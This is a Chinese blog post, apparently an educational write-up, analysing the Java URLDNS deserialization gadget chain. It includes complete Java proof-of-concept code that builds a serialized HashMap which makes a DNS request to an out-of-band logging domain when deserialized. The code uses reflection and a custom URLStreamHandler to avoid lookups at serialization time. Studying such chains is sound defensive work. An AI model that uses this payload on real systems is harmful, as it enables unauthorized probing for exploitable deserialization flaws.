@@ -1,0 +1,379 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【JAVA反序列化】URLDNS利用链 | Limpid</title>
+<link rel="shortcut icon" href="https://limpid94.github.io/favicon.ico?v=1645002667970">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://limpid94.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【JAVA反序列化】URLDNS利用链 | Limpid - Atom Feed" href="https://limpid94.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Java反序列化漏洞存在的形式
+1、入口类的readObject存在危险方法调用行为。（A类中直接存在危险方法）
+2、入口类的readObject使用的参数包含可控类，可控类存在危险方法。（A类中间接调用危险方法）
+3、入口类的readOb..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://limpid94.github.io">
+  <img class="avatar" src="https://limpid94.github.io/images/avatar.png?v=1645002667970" alt="">
+  </a>
+  <h1 class="site-title">
+    Limpid
+  </h1>
+  <p class="site-description">
+    Keep thinking , keeping learning
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【JAVA反序列化】URLDNS利用链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-02-07
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="java反序列化漏洞存在的形式">Java反序列化漏洞存在的形式</h2>
+<p>1、入口类的readObject存在危险方法调用行为。（A类中直接存在危险方法）<br>
+2、入口类的readObject使用的参数包含可控类，可控类存在危险方法。（A类中间接调用危险方法）<br>
+3、入口类的readObject调用了可控类，而该类又调用了其他的危险方法类。（A类中调用B类，B类又调用其他危险方法）<br>
+4、构造函数/静态代码块等加载时隐式执行。</p>
+<h2 id="java反序列化利用链的查找思路">JAVA反序列化利用链的查找思路</h2>
+<p>首先查找的类必须继承Serializable，其次在查找入口类时需要满足重写readObject、参数类型宽泛和所查找的类最好来自于JDK。</p>
+<h2 id="urldns">URLDNS</h2>
+<h3 id="urldns如何触发dns请求原理">URLDNS如何触发DNS请求原理</h3>
+<p>通过查找资料，得知该调用链的调用情况如下：</p>
+<pre><code> *   Gadget Chain:
+ *     HashMap.readObject()
+ *       HashMap.putVal()
+ *         HashMap.hash()
+ *           URL.hashCode()
+</code></pre>
+<p>在<code>URL.hashCode()</code>中调用了<code>handler.hashCode()</code></p>
+<pre><code class="language-java">    public synchronized int hashCode() {
+        if (hashCode != -1)
+            return hashCode;
+
+        hashCode = handler.hashCode(this);
+        return hashCode;
+    }
+</code></pre>
+<p>此处的handler是URLStreamHandler类，其中的hashCode()代码如下</p>
+<pre><code class="language-java">    protected int hashCode(URL u) {
+        int h = 0;
+
+        // Generate the protocol part.
+        String protocol = u.getProtocol();
+        if (protocol != null)
+            h += protocol.hashCode();
+
+        // Generate the host part.
+        InetAddress addr = getHostAddress(u);
+        if (addr != null) {
+            h += addr.hashCode();
+        } else {
+            String host = u.getHost();
+            if (host != null)
+                h += host.toLowerCase().hashCode();
+        }
+        ......
+</code></pre>
+<p>这里调用<code>getHostAddress</code>方法又会将传入的url交给<code>InetAddress.getByName()</code>方法：</p>
+<pre><code class="language-java">    protected synchronized InetAddress getHostAddress(URL u) {
+        if (u.hostAddress != null)
+            return u.hostAddress;
+
+        String host = u.getHost();
+        if (host == null || host.equals(&quot;&quot;)) {
+            return null;
+        } else {
+            try {
+                u.hostAddress = InetAddress.getByName(host);
+            } catch (UnknownHostException ex) {
+                return null;
+            } catch (SecurityException se) {
+                return null;
+            }
+        }
+        return u.hostAddress;
+    }
+</code></pre>
+<p>该方法会返回所提供的域名对应的IP，因此在此处会产生一次域名查询。</p>
+<h3 id="urldns反序列化链的构建">URLDNS反序列化链的构建</h3>
+<p>由于URL中的handler是被transient修饰的URLStreamHandler类的对象，因此在序列化时不会写入序列化的结果中，并且在writeObject方法中没有其他的特色处理（如下两张图），因此直接序列化是行不通的<br>
+<img src="https://limpid94.github.io/post-images/1644329621179.PNG" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1644329704713.PNG" alt="" loading="lazy"></figure>
+<p>于是需要查找其他的入口类中调用了hashCode方法的类。<br>
+在本文开头处提到，查找的时候最好找具有三个特点地类（重写readObject、参数类型宽泛和JDK自带）。于是HashMap类就比较符合。HashMap为了保证在不同版本中的hash值的唯一性，重新定义了自己的hashCode计算方法并且重写了readObject方法。</p>
+<p>在<code>HashMap的readObject</code>方法中循环从流中读取<code>key</code>和<code>value</code>的值并用<code>putVal</code>来放入map中，并且调用<code>hash()</code>来计算哈希值。<br>
+<img src="https://limpid94.github.io/post-images/1644332524763.PNG" alt="" loading="lazy"><br>
+追入hash()，看到具体源码：<br>
+<img src="https://limpid94.github.io/post-images/1644332622063.PNG" alt="" loading="lazy"><br>
+若传入的key为URL类，则key.hashCode()则调用了URL类的hashCode方法。<br>
+于是大致可以新建一个HashMap的示例并放入key为URL的示例，value为任意内容（此处为Integer）</p>
+<pre><code class="language-java">import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.net.URL;
+import java.util.HashMap;
+
+public class MyURLDNS {
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static void main(String[] args) throws IOException {
+        HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;&gt;();
+        hashmap.put(new URL(&quot;http://13bf5a54.dns.1433.eu.org&quot;),123);
+        serialize(hashmap);
+    }
+
+}
+</code></pre>
+<p>但是这样会有个问题，在反序列化过程中由于hashCode已经有值了，于是直接返回hashCode，不会再调用hash方法进行计算，因此无法触发DNS查询。<br>
+为了避免这个现象，需要使用反射的方式来修改hashCode的值<br>
+于是main函数部分变成：</p>
+<pre><code class="language-java">    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
+        HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;&gt;();
+        URL u = new URL(&quot;http://93284a7e.dns.1433.eu.org&quot;);
+        hashmap.put(u,123);
+
+        Field field = URL.class.getDeclaredField(&quot;hashCode&quot;);
+        field.setAccessible(true);
+        field.set(u,-1);
+
+        serialize(hashmap);
+</code></pre>
+<p>但是还是存在一个问题，序列化时就会产生DNS请求，干扰测试结果。<br>
+为了解决该问题，ysoserial中的解决办法就是自己写一个hander类，将<code>openConnection</code>和<code>getHostAddress</code>改写成返回null的操作。</p>
+<pre><code class="language-java">//自己实现的URLStreamHandler类
+    static class MyURLStreamHandler extends URLStreamHandler {
+
+        @Override
+        protected URLConnection openConnection(URL u) throws IOException {
+            return null;
+        }
+
+        @Override
+        protected synchronized InetAddress getHostAddress(URL u) {
+            return null;
+        }
+    }
+
+</code></pre>
+<p>然后修改main方法中的部分代码：</p>
+<pre><code class="language-java">    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
+        HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;&gt;();
+        URLStreamHandler handler = new MyURLStreamHandler();
+        URL u = new URL( null,&quot;http://99efe118.dns.1433.eu.org&quot;, handler);
+        hashmap.put(u,123);
+
+        Field field = URL.class.getDeclaredField(&quot;hashCode&quot;);
+        field.setAccessible(true);
+        field.set(u,-1);
+
+        serialize(hashmap);
+</code></pre>
+<p>此时序列化时就不会产生DNS查询。<br>
+当执行反序列化时，就会产生DNS查询，达到目的</p>
+<pre><code class="language-java">import java.io.*;
+import java.lang.reflect.Field;
+import java.net.InetAddress;
+import java.net.URL;
+import java.net.URLConnection;
+import java.net.URLStreamHandler;
+import java.util.HashMap;
+
+public class MyURLDNS {
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
+        HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;&gt;();
+        URLStreamHandler handler = new MyURLStreamHandler();
+        URL u = new URL( null,&quot;http://99efe118.dns.1433.eu.org&quot;, handler);
+        hashmap.put(u,123);
+
+        Field field = URL.class.getDeclaredField(&quot;hashCode&quot;);
+        field.setAccessible(true);
+        field.set(u,-1);
+
+        serialize(hashmap);
+
+        //反序列化
+
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));
+        ois.readObject();
+    }
+
+    static class MyURLStreamHandler extends URLStreamHandler {
+
+        @Override
+        protected URLConnection openConnection(URL u) throws IOException {
+            return null;
+        }
+
+        @Override
+        protected synchronized InetAddress getHostAddress(URL u) {
+            return null;
+        }
+    }
+
+}
+
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://limpid94.github.io/post-images/1644395901500.PNG" alt="" loading="lazy"></figure>
+<h2 id="参考材料">参考材料</h2>
+<p>《Java反序列化漏洞学习 Commons Collection》https://tttang.com/archive/1337/<br>
+《深入了解序列化writeObject、readObject、readResolve》https://blog.csdn.net/Leon_cx/article/details/81517603<br>
+《URLDNS利用链分析》https://johnfrod.top/%E5%AE%89%E5%85%A8/urldns%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E7%9A%84%E5%BD%A2%E5%BC%8F">Java反序列化漏洞存在的形式</a></li>
+<li><a href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%9F%A5%E6%89%BE%E6%80%9D%E8%B7%AF">JAVA反序列化利用链的查找思路</a></li>
+<li><a href="#urldns">URLDNS</a>
+<ul>
+<li><a href="#urldns%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91dns%E8%AF%B7%E6%B1%82%E5%8E%9F%E7%90%86">URLDNS如何触发DNS请求原理</a></li>
+<li><a href="#urldns%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%9A%84%E6%9E%84%E5%BB%BA">URLDNS反序列化链的构建</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%9D%90%E6%96%99">参考材料</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://limpid94.github.io/post/pwn-linux-zhan-yi-chu-ret2csuxctf2015-pwn100/">
+              <h3 class="post-title">
+                【PWN】Linux栈溢出——ret2csu（XCTF2015-PWN100)
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by Limpid .
+  <a class="rss" href="https://limpid94.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
